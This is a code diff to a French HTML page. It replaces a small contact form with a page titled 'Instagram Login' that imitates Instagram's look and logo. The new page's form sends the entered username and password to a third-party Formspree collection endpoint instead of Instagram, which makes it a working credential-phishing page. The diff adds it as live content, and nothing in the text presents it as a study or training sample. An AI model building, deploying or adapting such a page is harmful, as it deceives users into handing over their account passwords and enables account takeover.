@@ -1,35 +1,99 @@
-<form id="myForm">
-    <label>Nom :</label>
-    <input type="text" name="name" required><br><br>
-
-    <label>Email :</label>
-    <input type="email" name="email" required><br><br>
-
-    <label>Message :</label>
-    <textarea name="message" required></textarea><br><br>
-
-    <button type="submit">Envoyer</button>
-</form>
-
-<p id="confirmationMessage" style="display:none; color: green;">Merci ! Votre message a été envoyé.</p>
-
-<script>
-document.getElementById("myForm").addEventListener("submit", function(event) {
-    event.preventDefault(); // Empêche le rechargement de la page
-
-    var formData = new FormData(this);
-
-    fetch("https://formspree.io/f/xjkgelow", {
-        method: "POST",
-        body: formData,
-        headers: { "Accept": "application/json" }
-    }).then(response => {
-        if (response.ok) {
-            document.getElementById("myForm").style.display = "none"; // Cache le formulaire
-            document.getElementById("confirmationMessage").style.display = "block"; // Affiche le message
-        } else {
-            alert("Erreur lors de l'envoi du message.");
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
         }
-    }).catch(error => alert("Erreur : " + error));
-});
-</script>
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fafafa;
+        }
+
+        .login-container {
+            width: 350px;
+            padding: 20px;
+            background: white;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+        }
+
+        .login-container img {
+            width: 175px;
+            margin: 20px 0;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            outline: none;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            border: none;
+            color: white;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .login-btn:disabled {
+            background-color: #b2dffc;
+        }
+
+        .signup-link {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .signup-link a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .forgot-password {
+            font-size: 12px;
+            margin-top: 10px;
+            color: #00376b;
+            text-decoration: none;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        
+        <form action="https://formspree.io/f/xjkgelow" method="POST">
+            <input type="text" name="username" class="input-field" placeholder="Nom d'utilisateur" required>
+            <input type="password" name="password" class="input-field" placeholder="Mot de passe" required>
+            <button type="submit" class="login-btn">Connexion</button>
+        </form>
+
+        <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+
+        <p class="signup-link">Pas encore inscrit ? <a href="#">Inscris-toi</a></p>
+    </div>
+
+</body>
+</html>
